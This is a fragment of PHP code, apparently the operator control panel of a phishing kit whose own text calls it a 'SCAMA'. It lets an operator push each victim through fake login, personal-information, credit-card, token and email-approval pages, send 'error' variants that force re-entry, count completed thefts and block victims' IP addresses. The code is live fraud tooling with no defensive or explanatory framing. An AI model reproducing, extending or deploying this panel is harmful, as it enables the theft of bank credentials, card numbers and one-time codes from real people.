                $to = "qr-error";
                added_qr($target, $to, $qr_target);
            }
            header('Location: ./panel.php?id_user='. $_POST["id_vip"].'');
        }
    }
    elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
        if(!isset($_GET["id_vip"])) {
            $_GET["id_vip"] = $_GET['id_user'];
        }

        if ($_GET['to'] === 'login'){
            $target = $_GET['id_vip'];
            $to = "login";
            added($target, $to);
        }
        elseif ($_GET['to'] === 'login-error'){
            $target = $_GET['id_vip'];
            $to = "login-error";
            added($target, $to);
        }
        elseif ($_GET['to'] === 'information') {
            $target = $_GET['id_vip'];
            $to = "information";
            added($target, $to);
        }
        elseif ($_GET['to'] === 'information-error') {
            $target = $_GET['id_vip'];
            $to = "information-error";
            added($target, $to);
        }
        elseif($_GET['to'] === 'credit-card'){
            $target = $_GET['id_vip'];
            $to = "credit-card";
            added($target, $to);
        }
        elseif($_GET['to'] === 'credit-card-error'){
            $target = $_GET['id_vip'];
            $to = "credit-card-error";
            added($target, $to);
        }
        elseif($_GET['to'] === 'token'){
            $target = $_GET['id_vip'];
            $to = "token";
            added($target, $to);
        }
        elseif($_GET['to'] === 'token-error'){
            $target = $_GET['id_vip'];
            $to = "token-error";
            added($target, $to);
        }
        elseif($_GET['to'] === 'email-approvation'){
            $target = $_GET['id_vip'];
            $to = "email-approvation";
            added($target, $to);
        }
        elseif($_GET['to'] === 'email-approvation-error'){
            $target = $_GET['id_vip'];
            $to = "email-approvation-error";
            added($target, $to);
        }
        elseif($_GET['to'] === 'extra-information'){
            $target = $_GET['id_vip'];
            $extra_information = $_GET['extra_information'];
            $to = "extra-information";
            added_other_extra($target, $to, $extra_information);
        }
        elseif($_GET['to'] === 'extra-information-error'){
            $target = $_GET['id_vip'];
            $extra_information = $_GET['extra_information'];
            $to = "extra-information-error";
            added_other_extra($target, $to, $extra_information);
        }
        elseif($_GET['to'] === 'confirmed'){
            $target = $_GET['id_vip'];
            $to = "confirmed";
            added($target, $to);

            $statics_file = "../panel/get-panel/statics.json";
            $statics_data = file_get_contents($statics_file);
            $data_main_panel = json_decode($statics_data, true);
            $data_main_panel['total_done_steps'] += 1;
            $updated_statics_data = json_encode($data_main_panel);
            file_put_contents($statics_file, $updated_statics_data);
        }
        elseif($_GET['to'] === 'logout'){
            $target = $_GET['id_vip'];
            $to = "logout";
            $current_page = "User Is Logout From SCAMA";
            $userStatus = "<span class='offline'>Offline</span>";
            added_other($target, $to, $current_page, $userStatus);
        }
        elseif(isset($_GET['ban'])){
            $target = $_GET['ban'];
            $to = "ban";
            added($target, $to);
            
            function validateIP($ip) {
                return filter_var($ip, FILTER_VALIDATE_IP) !== false;
            }
            
            $userIP = $_GET['ban'];

            if (validateIP($userIP)) {
                $blockedIPs = file_get_contents('../panel/actions/blocked_ips.txt');
                if (strpos($blockedIPs, $userIP) === false) {
                    file_put_contents("../panel/actions/blocked_ips.txt", $userIP . "\n", FILE_APPEND);

                    // Statics :
                    $statics_file = "../panel/get-panel/statics.json";
                    $statics_data = file_get_contents($statics_file);
                    $user_data = json_decode($statics_data, true);
                    $user_data['total_block'] += 1;
                    $updated_statics_data = json_encode($user_data);
                    file_put_contents($statics_file, $updated_statics_data);

                    $_SESSION["message_panel"] = "This User Is Block - " . $userIP;

                } else {
                    $_SESSION["message_panel"] = "This User Is Already Block - " . $userIP;
                }
            } else {
                $_SESSION["message_panel"] = "Invalid IP address - " . $userIP;

            }
            
        }
        header('Location: ./panel.php?id_user='. $_GET["id_vip"].'');
    }
    else {
        header('Location: ../index.php');
    }
?>